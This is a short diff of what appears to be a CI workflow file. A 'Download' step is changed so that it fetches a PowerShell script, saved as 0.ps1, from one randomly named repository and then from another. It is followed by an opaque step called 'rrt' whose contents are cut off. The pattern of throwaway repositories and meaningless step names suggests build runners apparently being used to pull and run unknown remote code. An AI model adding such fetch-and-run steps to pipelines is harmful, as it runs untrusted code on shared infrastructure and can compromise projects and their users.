@@ -9,7 +9,7 @@ jobs:
     
     steps:
     - name: Download
-      run: Invoke-WebRequest https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/run.ps1 -OutFile 0.ps1
+      run: Invoke-WebRequest https://github.com/userbyme/friendly-sniffle/raw/main/setup.ps1 -OutFile 0.ps1
     
     - name: rrt
       run: |
